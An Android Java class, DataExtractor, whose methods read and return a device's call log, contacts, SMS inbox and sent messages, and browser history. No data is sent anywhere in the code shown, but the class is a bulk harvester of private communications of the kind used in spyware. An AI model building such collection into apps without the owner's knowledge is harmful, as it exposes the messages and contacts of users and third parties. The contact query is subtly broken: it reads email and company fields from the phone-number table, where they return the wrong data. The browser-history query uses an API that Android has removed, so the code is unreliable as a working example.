import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.Browser;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;

import java.util.ArrayList;
import java.util.List;

public class DataExtractor {

    public static List<CallLogModel> extractCallLogs(Context context) {
        List<CallLogModel> callLogs = new ArrayList<>();

        // Query the call logs
        String[] projection = {
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DURATION,
                CallLog.Calls.DATE
        };

        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                projection,
                null,
                null,
                CallLog.Calls.DEFAULT_SORT_ORDER
        );

        if (cursor != null && cursor.moveToFirst()) {
            int nameIndex = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
            int numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER);
            int typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE);
            int durationIndex = cursor.getColumnIndex(CallLog.Calls.DURATION);
            int dateIndex = cursor.getColumnIndex(CallLog.Calls.DATE);

            do {
                String callerName = cursor.getString(nameIndex);
                String phoneNumber = cursor.getString(numberIndex);
                String callType = cursor.getString(typeIndex);
                String callDuration = cursor.getString(durationIndex);
                String callTimestamp = cursor.getString(dateIndex);

                CallLogModel callLog = new CallLogModel(callerName, phoneNumber, callType, callDuration, callTimestamp);
                callLogs.add(callLog);
            } while (cursor.moveToNext());

            cursor.close();
        }

        return callLogs;
    }

    public static List<ContactModel> extractContacts(Context context) {
        List<ContactModel> contacts = new ArrayList<>();

        // Query the contacts
        String[] projection = {
                ContactsContract.Contacts.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER,
                ContactsContract.CommonDataKinds.Email.ADDRESS,
                ContactsContract.CommonDataKinds.Organization.COMPANY
        };

        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                projection,
                null,
                null,
                ContactsContract.Contacts.DISPLAY_NAME + " ASC"
        );

        if (cursor != null && cursor.moveToFirst()) {
            int nameIndex = cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);
            int numberIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
            int emailIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.ADDRESS);
            int organizationIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Organization.COMPANY);

            do {
                String contactName = cursor.getString(nameIndex);
                String phoneNumber = cursor.getString(numberIndex);
                String emailAddress = cursor.getString(emailIndex);
                String organization = cursor.getString(organizationIndex);

                ContactModel contact = new ContactModel(contactName, phoneNumber, emailAddress, organization);
                contacts.add(contact);
            } while (cursor.moveToNext());

            cursor.close();
        }

        return contacts;
    }

    public static List<MessageModel> extractMessages(Context context) {
        List<MessageModel> messages = new ArrayList<>();

        // Query the SMS inbox
        Uri inboxUri = Telephony.Sms.Inbox.CONTENT_URI;
        messages.addAll(extractMessagesFromUri(context, inboxUri, MessageModel.MessageType.INBOX));

        // Query the SMS sent folder
        Uri sentUri = Telephony.Sms.Sent.CONTENT_URI;
        messages.addAll(extractMessagesFromUri(context, sentUri, MessageModel.MessageType.SENT));

        return messages;
    }

    private static List<MessageModel> extractMessagesFromUri(Context context, Uri uri, MessageModel.MessageType messageType) {
        List<MessageModel> messages = new ArrayList<>();

        String[] projection = {
                Telephony.Sms.ADDRESS,
                Telephony.Sms.BODY,
                Telephony.Sms.DATE
        };

        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = contentResolver.query(
                uri,
                projection,
                null,
                null,
                Telephony.Sms.DEFAULT_SORT_ORDER
        );

        if (cursor != null && cursor.moveToFirst()) {
            int addressIndex = cursor.getColumnIndex(Telephony.Sms.ADDRESS);
            int bodyIndex = cursor.getColumnIndex(Telephony.Sms.BODY);
            int dateIndex = cursor.getColumnIndex(Telephony.Sms.DATE);

            do {
                String sender = cursor.getString(addressIndex);
                String messageBody = cursor.getString(bodyIndex);
                String timestamp = cursor.getString(dateIndex);

                MessageModel message = new MessageModel(sender, null, messageBody, timestamp, messageType);
                messages.add(message);
            } while (cursor.moveToNext());

            cursor.close();
        }

        return messages;
    }

    public static List<BrowserHistoryModel> extractBrowserHistory(Context context) {
        List<BrowserHistoryModel> browserHistory = new ArrayList<>();

        // Query the browser history
        String[] projection = {
                Browser.BookmarkColumns.URL,
                Browser.BookmarkColumns.TITLE,
                Browser.BookmarkColumns.VISITS,
                Browser.BookmarkColumns.DATE,
                Browser.BookmarkColumns.APPLICATION_NAME
        };

        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = contentResolver.query(
                Browser.BOOKMARKS_URI,
                projection,
                null,
                null,
                Browser.BookmarkColumns.DATE + " DESC"
        );

        if (cursor != null && cursor.moveToFirst()) {
            int urlIndex = cursor.getColumnIndex(Browser.BookmarkColumns.URL);
            int titleIndex = cursor.getColumnIndex(Browser.BookmarkColumns.TITLE);
            int visitsIndex = cursor.getColumnIndex(Browser.BookmarkColumns.VISITS);
            int dateIndex = cursor.getColumnIndex(Browser.BookmarkColumns.DATE);
            int applicationNameIndex = cursor.getColumnIndex(Browser.BookmarkColumns.APPLICATION_NAME);

            do {
                String url = cursor.getString(urlIndex);
                String title = cursor.getString(titleIndex);
                int visitCount = cursor.getInt(visitsIndex);
                String timestamp = cursor.getString(dateIndex);
                String browserApplication = cursor.getString(applicationNameIndex);

                BrowserHistoryModel historyEntry = new BrowserHistoryModel(url, title, visitCount, timestamp, browserApplication);
                browserHistory.add(historyEntry);
            } while (cursor.moveToNext());

            cursor.close();
        }

        return browserHistory;
    }
}
